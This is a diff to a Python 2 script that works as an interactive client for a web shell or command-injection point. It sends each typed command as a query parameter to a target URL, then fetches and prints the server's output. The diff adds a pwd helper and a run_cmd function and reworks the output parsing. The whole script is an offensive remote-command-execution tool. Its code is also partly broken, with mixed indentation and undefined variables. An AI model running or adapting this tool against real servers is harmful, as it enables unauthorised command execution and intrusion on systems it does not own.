@@ -17,7 +17,8 @@ args = parser.parse_args()
 command=""
 newDir=""
 oldDir=""
-
+parsedString=""
+history=['']
 def printHeader():
     print ("""
     
@@ -36,40 +37,40 @@ def printHeader():
 
 
 
-def parse(temp):
-
-    #parsedString = ""
-    #os.system("awk '!seen[$0]++' temp.txt > temp2.txt")
-    #os.system("awk '!seen[$1]++' temp.txt > temp2.txt")
-   
-
-    
-    #seperate = '<'
-    
-    #splitString = temp.split(seperate, 1) [0]
-    #lineList = splitString.split("\n") 
-
-    #lineSeen = set()
-    #for line in lineList:
-        #if line not in lineSeen:
-            #parsedString = parsedString + line + "\n"
-            #lineSeen.add(line)
-
-    return [parsedString for parsedString in temp if " " not in parsedString]
-    #return parsedString
+def parse(temp):   
+    parsedString=""
+    repeatString="" 
+    seperate = '<'
+    splitString = temp.split(seperate, 1) [0]
+    lineList = splitString.split("\n")
+    lineSeen = set()
+    bad_words = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
+    for line in lineList:
+	if not any(line.startswith(bad_word) for bad_word in bad_words):
+	    parsedString = parsedString + line + "\n"
+    splitLine = parsedString.split("\n")
+    for line in splitLine:
+	if line not in lineSeen:
+	    repeatString = repeatString + line + "\n"
+	    lineSeen.add(line)
+    return repeatString
 
 
 def chngDir(command):
+    newDir=""
     if "cd" in command:
         command = command.replace("cd ", "")
         if(newDir):
             olDir = newDir
             newDir = oldDir+newDir
         newDir = command
+    
+    return newDir
+
+def listNewDir(newDir):
     if "ls" in command:
-        command = command+" "+newDir
-        return command
-        #print newDir
+	command = command +" "+newDir
+    return command
 
 def curl(url):
     buffer = StringIO()
@@ -81,28 +82,37 @@ def curl(url):
     body = buffer.getvalue()
     return body
 
+def pwd():
+    command = "pwd"
+    url = args.url+"&"+args.variable+"="+command
+    temp = curl(url)
+    parsedString = parse(temp)
+    parsedString = parsedString.splitlines()
+    parsedString = parsedString[0].split(" ")
+    return parsedString[0]
 
-printHeader()
-
-
-#####  MAIN METHOD #####
-while(command != "exit"):
-    command = raw_input("$ ")
-    #chngDir(command)
-
-    if "cd" in command:
-        command = command.replace("cd ", "")
-        if(newDir):
-            olDir = newDir
-            newDir = oldDir+newDir
-        newDir = command
-    if "ls" in command:
-        command = command+" "+newDir
-
+def run_cmd(command):
     command = command.replace(" ", "%20")
     url = args.url+"&"+args.variable+"="+command
     temp = curl(url)
     parsedString = parse(temp)
     print parsedString
 
+printHeader()
 
+
+#####  MAIN METHOD #####
+dir = pwd()
+while(command != "exit"):
+    command = raw_input("%s$ " % dir)
+
+    if "cd" in command:
+        command = command.replace("cd ", "")
+ 	if(dir):
+ 	    oldDir = dir
+ 	    dir = oldDir+dir
+	dir = command
+    if "ls" in command:
+	command = command +" "+dir
+
+    run_cmd(command)
